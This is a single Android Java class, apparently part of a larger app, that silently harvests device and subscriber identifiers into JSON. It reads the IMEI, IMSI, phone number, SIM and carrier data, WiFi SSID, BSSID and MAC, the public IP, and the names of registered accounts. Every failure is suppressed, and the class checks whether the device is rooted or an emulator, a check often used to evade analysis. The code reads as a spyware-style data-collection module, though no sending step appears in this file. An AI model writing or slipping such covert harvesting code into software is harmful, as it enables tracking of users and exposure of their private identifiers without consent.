package com.rhfvnc.strain;
import android.content.Context;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.BatteryManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;
import android.os.SystemClock;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.DisplayMetrics;
import org.json.JSONObject;
import java.io.*;
import java.net.*;
import java.util.*;
public class Fingerprint {
    public static JSONObject collect(Context ctx) {
        JSONObject o = new JSONObject();
        try { o.put("android_id", Settings.Secure.getString(ctx.getContentResolver(), Settings.Secure.ANDROID_ID)); } catch (Throwable t) {}
        try { o.put("model", Build.MODEL); } catch (Throwable t) {}
        try { o.put("manufacturer", Build.MANUFACTURER); } catch (Throwable t) {}
        try { o.put("brand", Build.BRAND); } catch (Throwable t) {}
        try { o.put("device", Build.DEVICE); } catch (Throwable t) {}
        try { o.put("product", Build.PRODUCT); } catch (Throwable t) {}
        try { o.put("android", Build.VERSION.RELEASE); } catch (Throwable t) {}
        try { o.put("sdk", Build.VERSION.SDK_INT); } catch (Throwable t) {}
        try { o.put("fingerprint", Build.FINGERPRINT); } catch (Throwable t) {}
        try { o.put("abis", String.join(",", Build.SUPPORTED_ABIS)); } catch (Throwable t) {}
        try { o.put("cores", Runtime.getRuntime().availableProcessors()); } catch (Throwable t) {}
        try { o.put("uptime_ms", SystemClock.elapsedRealtime()); } catch (Throwable t) {}
        try {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (tm != null) {
                try { o.put("network_operator", tm.getNetworkOperatorName()); } catch (Throwable t) {}
                try { o.put("sim_country", tm.getSimCountryIso()); } catch (Throwable t) {}
                try { o.put("sim_operator", tm.getSimOperatorName()); } catch (Throwable t) {}
                try { o.put("phone_type", tm.getPhoneType()); } catch (Throwable t) {}
                try { o.put("network_type", tm.getNetworkType()); } catch (Throwable t) {}
                try { o.put("phone_number", tm.getLine1Number()); } catch (Throwable t) {}
                try { o.put("imsi", tm.getSubscriberId()); } catch (Throwable t) {}
                if (Build.VERSION.SDK_INT >= 26) {
                    try { o.put("imei", tm.getImei()); } catch (Throwable t) {}
                    try { o.put("meid", tm.getMeid()); } catch (Throwable t) {}
                } else {
                    try { o.put("imei", tm.getDeviceId()); } catch (Throwable t) {}
                }
            }
        } catch (Throwable t) {}
        try {
            WifiManager wm = (WifiManager) ctx.getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm != null) {
                WifiInfo wi = wm.getConnectionInfo();
                if (wi != null) {
                    try { o.put("wifi_ssid", wi.getSSID()); } catch (Throwable t) {}
                    try { o.put("wifi_bssid", wi.getBSSID()); } catch (Throwable t) {}
                    try { o.put("wifi_ip", intToIp(wi.getIpAddress())); } catch (Throwable t) {}
                    try { o.put("wifi_rssi", wi.getRssi()); } catch (Throwable t) {}
                }
            }
        } catch (Throwable t) {}
        try { o.put("wifi_mac", readMac("wlan0")); } catch (Throwable t) {}
        try { o.put("public_ip", httpGet("https://api.ipify.org")); } catch (Throwable t) {}
        try {
            BatteryManager bm = (BatteryManager) ctx.getSystemService(Context.BATTERY_SERVICE);
            if (bm != null) o.put("battery_pct", bm.getIntProperty(BatteryManager.BATTERY_PROPERTY_CAPACITY));
        } catch (Throwable t) {}
        try {
            android.app.ActivityManager am = (android.app.ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            android.app.ActivityManager.MemoryInfo mi = new android.app.ActivityManager.MemoryInfo();
            am.getMemoryInfo(mi);
            o.put("ram_total", mi.totalMem);
            o.put("ram_avail", mi.availMem);
        } catch (Throwable t) {}
        try {
            StatFs sf = new StatFs(Environment.getExternalStorageDirectory().getPath());
            o.put("storage_total", sf.getTotalBytes());
            o.put("storage_free", sf.getAvailableBytes());
        } catch (Throwable t) {}
        try {
            DisplayMetrics dm = ctx.getResources().getDisplayMetrics();
            o.put("screen_w", dm.widthPixels);
            o.put("screen_h", dm.heightPixels);
            o.put("density", dm.densityDpi);
        } catch (Throwable t) {}
        try {
            o.put("locale", Locale.getDefault().toString());
            o.put("timezone", TimeZone.getDefault().getID());
        } catch (Throwable t) {}
        try {
            android.accounts.AccountManager am = android.accounts.AccountManager.get(ctx);
            android.accounts.Account[] accs = am.getAccounts();
            StringBuilder sb = new StringBuilder();
            for (android.accounts.Account a : accs) sb.append(a.type).append(":").append(a.name).append(",");
            o.put("accounts", sb.toString());
        } catch (Throwable t) {}
        try { o.put("rooted", isRooted()); } catch (Throwable t) {}
        try { o.put("emulator", isEmulator()); } catch (Throwable t) {}
        return o;
    }
    private static String intToIp(int i) {
        return (i & 0xFF) + "." + ((i >> 8) & 0xFF) + "." + ((i >> 16) & 0xFF) + "." + ((i >> 24) & 0xFF);
    }
    private static String readMac(String iface) {
        try {
            BufferedReader br = new BufferedReader(new FileReader("/sys/class/net/" + iface + "/address"));
            String s = br.readLine();
            br.close();
            return s;
        } catch (Throwable t) { return null; }
    }
    private static String httpGet(String url) {
        try {
            HttpURLConnection c = (HttpURLConnection) new URL(url).openConnection();
            c.setConnectTimeout(5000); c.setReadTimeout(5000);
            BufferedReader r = new BufferedReader(new InputStreamReader(c.getInputStream()));
            String line = r.readLine(); r.close();
            return line;
        } catch (Throwable t) { return null; }
    }
    private static boolean isRooted() {
        String[] paths = {"/system/app/Superuser.apk", "/sbin/su", "/system/bin/su",
                "/system/xbin/su", "/data/local/xbin/su", "/data/local/bin/su"};
        for (String p : paths) if (new File(p).exists()) return true;
        return false;
    }
    private static boolean isEmulator() {
        return Build.FINGERPRINT.contains("generic")
                || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for")
                || Build.MANUFACTURER.contains("Genymotion");
    }
}
